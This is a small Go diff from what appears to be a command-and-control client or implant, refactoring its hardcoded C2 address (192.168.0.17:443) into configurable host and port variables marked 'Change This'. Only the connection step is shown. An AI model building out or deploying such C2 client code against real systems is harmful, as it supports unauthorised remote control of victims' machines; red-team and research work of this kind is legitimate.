@@ -9,7 +9,10 @@ import (
 )
 
 func main() {
-	conn, err := net.Dial("tcp", "192.168.0.17:443")
+	c2Host := "192.168.0.17" // Change This
+	c2Port := "443"          // Change This
+	address := net.JoinHostPort(c2Host, c2Port)
+	conn, err := net.Dial("tcp", address)
 	if err != nil {
 		fmt.Println("[-] Failed to connect to C2:", err)
 		return
